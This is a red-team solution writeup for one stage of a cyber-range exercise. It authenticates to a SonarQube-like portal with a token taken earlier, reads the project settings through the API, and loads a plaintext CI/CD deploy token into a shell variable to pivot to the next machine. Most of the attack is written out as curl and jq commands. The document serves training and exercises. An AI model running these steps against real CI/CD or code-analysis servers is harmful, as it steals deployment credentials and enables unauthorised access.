# solve_red.md — M4 · dev-sonar
## Red Team Solution Writeup
**Machine:** M4 — PUL Code Intelligence Portal
**Vulnerability:** Plaintext CI/CD Deploy Token in SonarQube Project Settings API
**MITRE:** T1552.002 (Credentials in Registry / Configuration)

---
## Objective
Use the token saved from M3 in `$RANGE3_DIR/sonarqube-access.env` to authenticate to the Code Intelligence Portal API. Query project settings for `pul-firmware-ota` and load the Deploy Commander token from `sonar.ci.deploy_token` without printing it into the public writeup.

---
## Step-by-Step

### Step 1 — Verify Token Against API
```bash
curl --max-time 8 -fsS http://203.0.3.36:9200/api/authentication/validate \
     -H "X-Sonar-Token: $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")"
# {"valid":true}
```



### Step 2 — List Projects
```bash
curl --max-time 8 -fsS http://203.0.3.36:9200/api/projects/search \
     -H "Authorization: Bearer $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")" | jq .
```
Note project key: `pul-firmware-ota`




### Step 3 — Extract CI/CD Settings (THE VULNERABILITY)
```bash
umask 077
curl --max-time 8 -fsS "http://203.0.3.36:9200/api/settings/values?component=pul-firmware-ota" \
     -H "Authorization: Bearer $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")" \
     -o "$RANGE3_DIR/sonar-settings.json"
printf 'Setting keys: %s\n' "$(jq -r '[(if type == "array" then .[] else (.settings // .values // [])[] end) | .key] | join(", ")' "$RANGE3_DIR/sonar-settings.json")"
export DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
printf 'Deploy Commander token loaded into this shell; value not printed.\n'
```


Response includes:
```json
{"key": "sonar.ci.deploy_token", "value": "<redacted>"}
{"key": "sonar.ci.deploy_url",   "value": "http://11.x.x.x:8888"}
```

The settings value contains the scenario placeholder `11.x.x.x`; the deployed M5 service is reachable at `203.0.3.36:8888`.



**Pivot:** The Deploy Commander token is loaded into `DEPLOY_TOKEN` from `$RANGE3_DIR/sonar-settings.json`. Treat it as compromised and lab-only.

---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Credentials in Registry | T1552.002 |
| Discovery | Software Discovery | T1518 |
